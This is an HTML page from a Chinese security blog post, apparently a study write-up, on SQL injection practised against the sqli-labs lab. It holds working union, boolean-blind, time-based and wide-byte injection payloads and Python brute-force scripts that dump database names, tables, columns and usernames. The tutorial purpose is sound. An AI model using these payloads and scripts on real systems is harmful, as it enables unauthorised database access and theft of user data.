<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>sql姿势总结（一） | A10ng_&#39;s Blog</title>
<meta name="keywords" content="">
<meta name="description" content="mysql数据库基本操作语句可在以下博客学习。 https://blog.csdn.net/leiurse/article/details/106677106 SQL注入常用函数 mid()函数 SELECT MID(ColumnName, Start [, Length]) 从指定字段中提取出字段的内容 column_name">
<meta name="author" content="admin">
<link rel="canonical" href="https://a10nggg.github.io/archives/55/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://a10nggg.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://a10nggg.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://a10nggg.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://a10nggg.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://a10nggg.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://a10nggg.github.io/archives/55/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="sql姿势总结（一）" />
<meta property="og:description" content="mysql数据库基本操作语句可在以下博客学习。 https://blog.csdn.net/leiurse/article/details/106677106 SQL注入常用函数 mid()函数 SELECT MID(ColumnName, Start [, Length]) 从指定字段中提取出字段的内容 column_name" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://a10nggg.github.io/archives/55/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-12-21T14:05:33+00:00" />
<meta property="article:modified_time" content="2021-12-21T14:05:33+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="sql姿势总结（一）"/>
<meta name="twitter:description" content="mysql数据库基本操作语句可在以下博客学习。 https://blog.csdn.net/leiurse/article/details/106677106 SQL注入常用函数 mid()函数 SELECT MID(ColumnName, Start [, Length]) 从指定字段中提取出字段的内容 column_name"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://a10nggg.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "sql姿势总结（一）",
      "item": "https://a10nggg.github.io/archives/55/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "sql姿势总结（一）",
  "name": "sql姿势总结（一）",
  "description": "mysql数据库基本操作语句可在以下博客学习。 https://blog.csdn.net/leiurse/article/details/106677106 SQL注入常用函数 mid()函数 SELECT MID(ColumnName, Start [, Length]) 从指定字段中提取出字段的内容 column_name",
  "keywords": [
    
  ],
  "articleBody": "mysql数据库基本操作语句可在以下博客学习。\nhttps://blog.csdn.net/leiurse/article/details/106677106\nSQL注入常用函数 mid()函数 SELECT MID(ColumnName, Start [, Length])\n从指定字段中提取出字段的内容\ncolumn_name:字段名\nstart:开始位置\nlength:长度\n示例：SELECT MID(NAME,1,2) FROM test;\n{.wp-editor-md-post-content-link}\nlimit()函数 SELECT * FROM TABLE LIMIT M,N\n返回结果中的前几条数据或者中间的数据\nm是指从m位开始(第一位为0)\nn是指取n条\n示例：SELECT * FROM test LIMIT 1,2;\n{.wp-editor-md-post-content-link}\nconcat()函数 concat(str1,str2,str3,….)\nconcat()函数可以连接一个或者多个字符串\n返回结果为连接参数产生的字符串，但是如果其中一个参数为NULL ，则返回值为 NULL。\n示例：select concat('aa','bb','cc');\n{.wp-editor-md-post-content-link}\n当有值为空时：\n{.wp-editor-md-post-content-link}\ngroup_concat()函数 group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])\n分组拼接函数\n示例：select group_concat(name) from test;\n{.wp-editor-md-post-content-link}\nCount() 函数 COUNT(column_name)\n返回指定列的值的数目（NULL 不计入）\n示例：select count(name) from test;\n{.wp-editor-md-post-content-link}\nrand()函数 产生一个0~1的随机数\n示例：select rand();\n{.wp-editor-md-post-content-link}\nfloor()函数 向下取整\n示例：select floor(1.2);\n{.wp-editor-md-post-content-link}\nSubstr()函数 substr(a,b,c)\n截取字符串\na 所要截取字符串\nb 截取的位置\nc 截取的长度\n示例：select substr('abcdefg',2,3);\n{.wp-editor-md-post-content-link}\nAscii()函数 将字符串的第一个字符转换成ASCII码的形式\n示例：select ascii('abcd');\n{.wp-editor-md-post-content-link}\nLeft()函数 left(string,num)\n得到字符串最左边指定个数的字符\n{.wp-editor-md-post-content-link}\nORD()函数 返回第一个字符的ASCII码\n示例：SELECT ORD('asdf');\n{.wp-editor-md-post-content-link}\n常用系统函数： user() ：当前使用者的用户名\ndatabase()：当前数据库名\nversion()：数据库版本\ndatadir：读取数据库的绝对路径\n@@vasedir：mysql安装路径\n@@version_compile_os：操作系统\nSQL注入原理： SQL注入实质上是将用户传入的参数没有进行严格的处理拼接sql语句的执行字符串中。\n可能存在注入的地方有：登陆页面，搜索，获取HTTP头的信息(client-ip , x-forward-of)，订单处理（二次注入）等\n注入的参数类型：POST, GET, COOKIES, SERVER 其实只要值传到数据库的执行语句那么就可能存在sql注入。\n注入方法：union注入，时间盲注，布尔盲注，宽字节注入，DNSlog盲注，报错注入，堆叠注入，flase注入。\nunion注入 union注入，就是通过unio函数将sql语句拼接，从而达到执行恶意sql语句的目的；\n注入的流程为：\n1.首先判断是否存在注入点及注入的类型。\n2.使用ORDER BY 查询列数。\n3.观察回显的位置。\n4.获取数据库名。\n5.获取数据库中的所有表名。\n6.获取数据库的表中的所有字段名\n7.获取字段中的数据\nunion注入的一些知识点：\nUNION 操作符用于合并两个或多个 SELECT 语句的结果集。（请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。）\nORDER BY 语句用于对结果集进行排序。\nSQL中的information_scheme数据库：\n默认生成的数据库，该数据库保存了SQL所的所有数据库的信息。\n以sqli-labs为例。\n1.首先判断是否存在注入点及注入的类型。 首先在怀疑可能有注入的地方输入单引号（’）,判断其为数字型还是字符型。\n输入单引号报错，加上注释没有报错，这时已经将后边的注释了，单引号闭合成功，说明这是字符型注入。\n?id=1'--+\n2.union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的列数，因此我们要对字段数进行判断。 ?id=1%27order%20by%203--+\n判断列数，一般采用二分法，这样能大大提高效率。\n当输入的数不报错后，值加一报错说明这时就是他的列数了；\n列如上面，值是3不报错，输入4报错了，说明列数就为3。\n3.观察回显的位置。 ?id=0%27union%20select%201,2,3--+\n这里注意，id的值一定不能有回显，不然会占用回显位置，不能发现可回显的位置。id的值可为0可为负数。\n{.wp-editor-md-post-content-link}\n4.获取数据库名。 找到回显位置后，将有回显的位置，换成sql语句开始爆库。\n?id=0%27union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata--+\n得到数据库的所有库名。\n{.wp-editor-md-post-content-link}\n5.获取数据库中的所有表名。 ?id=0'union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')--+\n{.wp-editor-md-post-content-link}\n6.获取数据库的表中的所有字段名 ?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name = 'users'),3 --+\n{.wp-editor-md-post-content-link}\n7.获取字段中的数据 ?id=0' union select 1,(select group_concat(username) from security.users),3 --+\n{.wp-editor-md-post-content-link}\n布尔盲注 布尔盲注是有回显的，但是返回的只有两种信息，正确和错误，所以我们可以用sql语句来对数据库的内容根据回显情况来写脚本进行爆破。\n布尔注入常用函数：\nLength（）函数 返回字符串的长度\nSubstr（）截取字符串\nAscii（）返回字符的ascii码\nsleep(n)：将程序挂起一段时间 n为n秒\nif(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句\n这些函数咱在前面大多都已经讲过了。\n首先判断数据库名字长度：\n{.wp-editor-md-post-content-link}\n可以看到，当前数据库的长度为8，当我们令其等与8时就会返回1，也就是等式成立。\n这儿就可以写个脚本来进行爆破。\n下面我们以sqli-labs第8关为例。\n当我们输入id=1时，页面上有You are in………..的字符，当加上引号，这串字符消失，加上注释后，字符再次出现。说明这是字符型注入。\n下面我们判断其数据库的长度。\n这里可以不用写脚本，可以在浏览器构造好语句后用bp抓包，然后数值爆破就能得到数据库长度。\n{.wp-editor-md-post-content-link}\n这里爆破的是长度，所以用数字爆破，增量为一。\n{.wp-editor-md-post-content-link}\n这里可以看到数字8的长度不同，所以数据库的长度就是8。\n下边写脚本爆破（脚本写的丑，带佬们勿喷）\nimport requests a=1 b='' while a\u003c9: for i in range(44,124): r = requests.get(\"http://127.0.0.1/sql/Less-8/?id=1%27%20and%20(ascii(substr(database(),\"+str(a)+\",1)))=\"+str(i)+\"--+\") if 'You' in r.text: print(chr(i)) b+=chr(i) a+=1 break print(b) 下边接着写脚本： import requests a = 0 #爆破表的数量 while 1: a+=1 r = requests.get(\"http://127.0.0.1/sql/Less-8/?id=1' and (select count(table_name) from information_schema.tables where table_schema='security')=\"+str(a)+\"--+\") if 'You' in r.text: tables_sum = a print('表的数量：'+str(tables_sum)) break #爆破每个表的字长 for i in range(0,tables_sum+1): table_name = '' for j in range(0,20): r1 = requests.get(\"http://127.0.0.1/sql/Less-8/?id=1' AND (LENGTH((select table_name from information_schema.`TABLES` where table_schema = database() LIMIT \"+str(i)+\",1))) = \"+str(j)+\"--+\") if 'You' in r1.text: table_len= j break #爆破表名 for k in range(0,table_len+1): for n in range(44,124): r2 = requests.get(\"http://127.0.0.1/sql/Less-8/?id=1' AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT \"+str(i)+\",1),\"+str(k)+\",1)) = \"+str(n)+\"--+\") if 'You' in r2.text: table_name += chr(n) continue print('| '+table_name) print('+------------------+') 写好之后就爆出表名，其中的语句跟union是差不多的，只是多了substr函数和limit函数。\n{.wp-editor-md-post-content-link}\n下一步是爆列名。\nimport requests a = 0 #爆破列的数量 while 1: a+=1 r = requests.get(\"http://127.0.0.1/sql/Less-8/?id=1' and (select count(column_name) from information_schema.columns where table_name='users')=\"+str(a)+\"--+\") if 'You' in r.text: columns_sum = a print('列的数量：'+str(columns_sum)) break #爆破每个表的表长 for i in range(0,columns_sum): column_name = '' for j in range(0,20): r1 = requests.get(\"http://127.0.0.1/sql/Less-8/?id=1' AND (LENGTH((select column_name from information_schema.columns where table_name = 'users' LIMIT \"+str(i)+\",1))) = \"+str(j)+\"--+\") if 'You' in r1.text: column_len= j break #爆破表名 for k in range(0,column_len+1): for n in range(44,124): r2 = requests.get(\"http://127.0.0.1/sql/Less-8/?id=1' AND ASCII(SUBSTR((select column_name FROM information_schema.columns where table_name = 'users' LIMIT \"+str(i)+\",1),\"+str(k)+\",1)) = \"+str(n)+\"--+\") if 'You' in r2.text: column_name += chr(n) continue print('| '+column_name) print('+------------------+') 下面爆字段内容\nimport requests a = 0 #爆字段的数量 while 1: a+=1 r = requests.get(\"http://127.0.0.1/sql/Less-8/?id=1' and (select count(username) from security.users)=\"+str(a)+\"--+\") if 'You' in r.text: columns_sum = a print('列的数量：'+str(columns_sum)) break #爆破每个字段的长度 for i in range(0,columns_sum): column_name = '' for j in range(0,20): r1 = requests.get(\"http://127.0.0.1/sql/Less-8/?id=1' AND (select length(username) from security.users LIMIT \"+str(i)+\",1) = \"+str(j)+\"--+\") if 'You' in r1.text: column_len= j break #爆破字段内容 for k in range(0,column_len+1): for n in range(44,124): r2 = requests.get(\"http://127.0.0.1/sql/Less-8/?id=1' AND ASCII(SUBSTR((select username from security.users LIMIT \"+str(i)+\",1),\"+str(k)+\",1)) = \"+str(n)+\"--+\") if 'You' in r2.text: column_name += chr(n) continue print('| '+column_name) print('+------------------+') 其实这几个脚本都是一样的，只是换了一下里面的payload，当第一个脚本写好之后，后面的只需要改一下就行。\n下面接着来讲一下sql盲注，sql盲注跟布尔盲注其实原理相同，只是在浏览器返回上没有视觉上的显示，需要我们构造SQL语句，当条件成立时通过数据库内的sleep()函数，造成延时，从而判断出数据库内的内容。最近在网上看到了一个延时注入的骚姿势，通过get_lock（）函数来形成延时。下次有时间我复现一下吧。 讲一下sql里边的if函数，if(c,a,b)，如果c为真执行a，否则执行b。这其实就是一个三元运算。\n这儿可以用之前的布尔盲注脚本改一下就可以了，他们的逻辑都是一样的，只是payload和判断方法是判断数据库的延时。\nimport requests import time a=1 b='' while a\u003c9: start_time = time.time() for i in range(44,124): r = requests.get(\"http://127.0.0.1/sql/Less-8/?id=1' and if(((ascii(substr(database(),\"+str(a)+\",1)))=\"+str(i)+\"),sleep(3),0)--+\") if time.time() - start_time \u003e= 3: print(chr(i)) b+=chr(i) a+=1 break print(b) 这是我用上边的脚本进行修改的，就是改了一下payload和判断，就成功的爆出了数后面的也可以用之前的脚本来改。\n宽字节注入\n开发者为了防止sql注入，对用户输入中的单引号（’）进行处理，在单引号前加上斜杠（\\）进行转义，这样被处理后的sql语句中，单引号不再具有原有的作用而是变成了普通的字符。\n宽字节注入原理： GBK 占用两字节\nASCII占用一字节\nPHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\\”），MYSQL默认字符集是GBK等宽字节字符集。\n大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\\，变成了 %df\\’，其中\\的十六进制是 %5C ，那么现在 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\\’ = %df%5c%27=縗’，有了单引号就好注入了。\n知道这个原理之后，后来的步骤就跟union注入一样了，唯一不一样的是，在查表和查库的时候，库名和表名在union注入里边需要用引号包起来，但是在这儿，引号被转义，我们就可以将其转成16进制来绕过。\n下边来实际操作一手\n以sqli-labs第32关为例\n我输入单引号的时候，在返回的内容里发现我的前面单引号给我加上了反斜杠，\n{.wp-editor-md-post-content-link}\n当我输入%df%27时页面报错，这是说明在这里%df与斜杠成功组合了逃逸出了单引号。\n{.wp-editor-md-post-content-link}\n当我再在后边加上注释符，发现页面又恢复正常了。说明在这儿存在宽字节注入。\n{.wp-editor-md-post-content-link}\n后边跟union就差不多了。\n查库?id=0%df' union select 1,2,group_concat(schema_name) from information_schema.schemata --+\n查表，在这注意的是由于引号会被转义，所以在这可以用十六进制表示，也就是table_schematable_schema=0x7365637572697479\n?id=0%df’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479–+\n查表，这儿的table_name也是同样的道理。\n?id=0%df' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+\n爆字段?id=0%df' union select 1,(select group_concat(username) from security.users),3 --+\n先写到这儿吧，后边的后边再写\n参考\nhttps://blog.csdn.net/weixin_45146120/article/details/100104131?utm_source=app\nhttps://blog.csdn.net/santtde/article/details/91353689\nhttps://www.w3school.com.cn/sql/sql_union.asp\nhttps://blog.csdn.net/weixin_43803070/article/details/89918772\n",
  "wordCount" : "3907",
  "inLanguage": "en",
  "datePublished": "2021-12-21T14:05:33Z",
  "dateModified": "2021-12-21T14:05:33Z",
  "author":{
    "@type": "Person",
    "name": "admin"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://a10nggg.github.io/archives/55/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "A10ng_'s Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://a10nggg.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://a10nggg.github.io/" accesskey="h" title="A10ng_&#39;s Blog (Alt + H)">A10ng_&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://a10nggg.github.io/" title="首页">
                    <span>首页</span>
                </a>
            </li>
            <li>
                <a href="https://a10nggg.github.io/posts/" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="https://a10nggg.github.io/categories/" title="分类">
                    <span>分类</span>
                </a>
            </li>
            <li>
                <a href="https://a10nggg.github.io/tags/" title="标签">
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="https://a10nggg.github.io/about/" title="关于">
                    <span>关于</span>
                </a>
            </li>
            <li>
                <a href="https://a10nggg.github.io/search/" title="搜索">
                    <span>搜索</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      sql姿势总结（一）
    </h1>
    <div class="post-meta"><span title='2021-12-21 14:05:33 +0000 +0000'>December 21, 2021</span>&nbsp;·&nbsp;admin

</div>
  </header> 
  <div class="post-content"><p>mysql数据库基本操作语句可在以下博客学习。<br>
<a href="https://blog.csdn.net/leiurse/article/details/106677106">https://blog.csdn.net/leiurse/article/details/106677106</a></p>
<h1 id="sql注入常用函数">SQL注入常用函数<a hidden class="anchor" aria-hidden="true" href="#sql注入常用函数">#</a></h1>
<h2 id="mid函数">mid()函数<a hidden class="anchor" aria-hidden="true" href="#mid函数">#</a></h2>
<p>SELECT MID(ColumnName, Start [, Length])<br>
从指定字段中提取出字段的内容<br>
column_name:字段名<br>
start:开始位置<br>
length:长度<br>
示例：<code>SELECT MID(NAME,1,2) FROM test;</code><br>
<a href="/uploads/2021/12/wp_editor_md_c3098cd72a2164427392ffe48560ffd8.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_c3098cd72a2164427392ffe48560ffd8.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h2 id="limit函数">limit()函数<a hidden class="anchor" aria-hidden="true" href="#limit函数">#</a></h2>
<p>SELECT * FROM TABLE LIMIT M,N<br>
返回结果中的前几条数据或者中间的数据<br>
m是指从m位开始(第一位为0)<br>
n是指取n条<br>
示例：<code>SELECT * FROM test LIMIT 1,2;</code><br>
<a href="/uploads/2021/12/wp_editor_md_7662fc5d92ee50eb8aef6174f5b93227.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_7662fc5d92ee50eb8aef6174f5b93227.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h2 id="concat函数">concat()函数<a hidden class="anchor" aria-hidden="true" href="#concat函数">#</a></h2>
<p>concat(str1,str2,str3,&hellip;.)<br>
concat()函数可以连接一个或者多个字符串<br>
返回结果为连接参数产生的字符串，但是如果其中一个参数为NULL ，则返回值为 NULL。<br>
示例：<code>select concat('aa','bb','cc');</code><br>
<a href="/uploads/2021/12/wp_editor_md_ae661f1ab5113e7b1ad5cc672006d7b1.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_ae661f1ab5113e7b1ad5cc672006d7b1.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}<br>
当有值为空时：<br>
<a href="/uploads/2021/12/wp_editor_md_bd23dd912f7a4754f372c40ff8698303.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_bd23dd912f7a4754f372c40ff8698303.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h2 id="group_concat函数">group_concat()函数<a hidden class="anchor" aria-hidden="true" href="#group_concat函数">#</a></h2>
<p>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator &lsquo;分隔符&rsquo;])<br>
分组拼接函数<br>
示例：<code>select group_concat(name) from test;</code><br>
<a href="/uploads/2021/12/wp_editor_md_8dc4b8a3263ad05a5c2fb60f72474f10.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_8dc4b8a3263ad05a5c2fb60f72474f10.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h2 id="count-函数">Count() 函数<a hidden class="anchor" aria-hidden="true" href="#count-函数">#</a></h2>
<p>COUNT(column_name)<br>
返回指定列的值的数目（NULL 不计入）<br>
示例：<code>select count(name) from test;</code><br>
<a href="/uploads/2021/12/wp_editor_md_8f73b007b6855c3cb8b8979d641282f8.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_8f73b007b6855c3cb8b8979d641282f8.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h2 id="rand函数">rand()函数<a hidden class="anchor" aria-hidden="true" href="#rand函数">#</a></h2>
<p>产生一个0~1的随机数<br>
示例：<code>select rand();</code><br>
<a href="/uploads/2021/12/wp_editor_md_8f73b007b6855c3cb8b8979d641282f8.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_8f73b007b6855c3cb8b8979d641282f8.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h2 id="floor函数">floor()函数<a hidden class="anchor" aria-hidden="true" href="#floor函数">#</a></h2>
<p>向下取整<br>
示例：<code>select floor(1.2);</code><br>
<a href="/uploads/2021/12/wp_editor_md_3f04a38011ef13f8e33c49d278992d44.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_3f04a38011ef13f8e33c49d278992d44.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h2 id="substr函数">Substr()函数<a hidden class="anchor" aria-hidden="true" href="#substr函数">#</a></h2>
<p>substr(a,b,c)<br>
截取字符串<br>
a 所要截取字符串<br>
b 截取的位置<br>
c 截取的长度<br>
示例：<code>select substr('abcdefg',2,3);</code><br>
<a href="/uploads/2021/12/wp_editor_md_df7d5f78e09ef150615bbe8954ac52f5.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_df7d5f78e09ef150615bbe8954ac52f5.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h2 id="ascii函数">Ascii()函数<a hidden class="anchor" aria-hidden="true" href="#ascii函数">#</a></h2>
<p>将字符串的第一个字符转换成ASCII码的形式<br>
示例：<code>select ascii('abcd');</code><br>
<a href="/uploads/2021/12/wp_editor_md_831a506b3b19b16a81f0a2170a2df238.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_831a506b3b19b16a81f0a2170a2df238.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h2 id="left函数">Left()函数<a hidden class="anchor" aria-hidden="true" href="#left函数">#</a></h2>
<p>left(string,num)<br>
得到字符串最左边指定个数的字符<br>
<a href="/uploads/2021/12/wp_editor_md_adff0c37b48ce0a931881d4f8416a36d.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_adff0c37b48ce0a931881d4f8416a36d.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h2 id="ord函数">ORD()函数<a hidden class="anchor" aria-hidden="true" href="#ord函数">#</a></h2>
<p>返回第一个字符的ASCII码<br>
示例：<code>SELECT ORD('asdf');</code><br>
<a href="/uploads/2021/12/wp_editor_md_c0979e8a71620dc713e4fcdef5bcee34.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_c0979e8a71620dc713e4fcdef5bcee34.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h2 id="常用系统函数">常用系统函数：<a hidden class="anchor" aria-hidden="true" href="#常用系统函数">#</a></h2>
<p>user() ：当前使用者的用户名<br>
database()：当前数据库名<br>
version()：数据库版本<br>
datadir：读取数据库的绝对路径<br>
@@vasedir：mysql安装路径<br>
@@version_compile_os：操作系统</p>
<h1 id="sql注入原理">SQL注入原理：<a hidden class="anchor" aria-hidden="true" href="#sql注入原理">#</a></h1>
<p>SQL注入实质上是将用户传入的参数没有进行严格的处理拼接sql语句的执行字符串中。<br>
可能存在注入的地方有：登陆页面，搜索，获取HTTP头的信息(client-ip , x-forward-of)，订单处理（二次注入）等<br>
注入的参数类型：POST, GET, COOKIES, SERVER 其实只要值传到数据库的执行语句那么就可能存在sql注入。<br>
注入方法：union注入，时间盲注，布尔盲注，宽字节注入，DNSlog盲注，报错注入，堆叠注入，flase注入。</p>
<h2 id="union注入">union注入<a hidden class="anchor" aria-hidden="true" href="#union注入">#</a></h2>
<p>union注入，就是通过unio函数将sql语句拼接，从而达到执行恶意sql语句的目的；<br>
注入的流程为：<br>
1.首先判断是否存在注入点及注入的类型。<br>
2.使用ORDER BY 查询列数。<br>
3.观察回显的位置。<br>
4.获取数据库名。<br>
5.获取数据库中的所有表名。<br>
6.获取数据库的表中的所有字段名<br>
7.获取字段中的数据<br>
union注入的一些知识点：<br>
UNION 操作符用于合并两个或多个 SELECT 语句的结果集。（请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。）<br>
ORDER BY 语句用于对结果集进行排序。<br>
SQL中的information_scheme数据库：<br>
默认生成的数据库，该数据库保存了SQL所的所有数据库的信息。<br>
以sqli-labs为例。</p>
<h3 id="1首先判断是否存在注入点及注入的类型">1.首先判断是否存在注入点及注入的类型。<a hidden class="anchor" aria-hidden="true" href="#1首先判断是否存在注入点及注入的类型">#</a></h3>
<p>首先在怀疑可能有注入的地方输入单引号（&rsquo;）,判断其为数字型还是字符型。<br>
输入单引号报错，加上注释没有报错，这时已经将后边的注释了，单引号闭合成功，说明这是字符型注入。<br>
<code>?id=1'--+</code></p>
<h3 id="2union有一个十分严格的约束条件因为是联合查询必选保证字段数一致即两个查询结果有相同的列数因此我们要对字段数进行判断">2.union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的列数，因此我们要对字段数进行判断。<a hidden class="anchor" aria-hidden="true" href="#2union有一个十分严格的约束条件因为是联合查询必选保证字段数一致即两个查询结果有相同的列数因此我们要对字段数进行判断">#</a></h3>
<p><code>?id=1%27order%20by%203--+</code></p>
<p>判断列数，一般采用二分法，这样能大大提高效率。<br>
当输入的数不报错后，值加一报错说明这时就是他的列数了；<br>
列如上面，值是3不报错，输入4报错了，说明列数就为3。</p>
<h3 id="3观察回显的位置">3.观察回显的位置。<a hidden class="anchor" aria-hidden="true" href="#3观察回显的位置">#</a></h3>
<p><code>?id=0%27union%20select%201,2,3--+</code></p>
<p>这里注意，id的值一定不能有回显，不然会占用回显位置，不能发现可回显的位置。id的值可为0可为负数。<br>
<a href="/uploads/2021/12/wp_editor_md_20d01526fd7b6d0abc85223fc6ed9f08.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_20d01526fd7b6d0abc85223fc6ed9f08.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h3 id="4获取数据库名">4.获取数据库名。<a hidden class="anchor" aria-hidden="true" href="#4获取数据库名">#</a></h3>
<p>找到回显位置后，将有回显的位置，换成sql语句开始爆库。<br>
<code>?id=0%27union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata--+</code></p>
<p>得到数据库的所有库名。<br>
<a href="/uploads/2021/12/wp_editor_md_8f9a6cb6bc301a655bd828d3b7eeb00a.jpg"><img loading="lazy" src="/uploads/2021/12/wp_editor_md_8f9a6cb6bc301a655bd828d3b7eeb00a.jpg" alt=""  />
</a>{.wp-editor-md-post-content-link}</p>
<h3 id="5获取数据库中的所有表名">5.获取数据库中的所有表名。<a hidden class="anchor" aria-hidden="true" href="#5获取数据库中的所有表名">#</a></h3>
<p><code>?id=0'union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')--+</code></p>
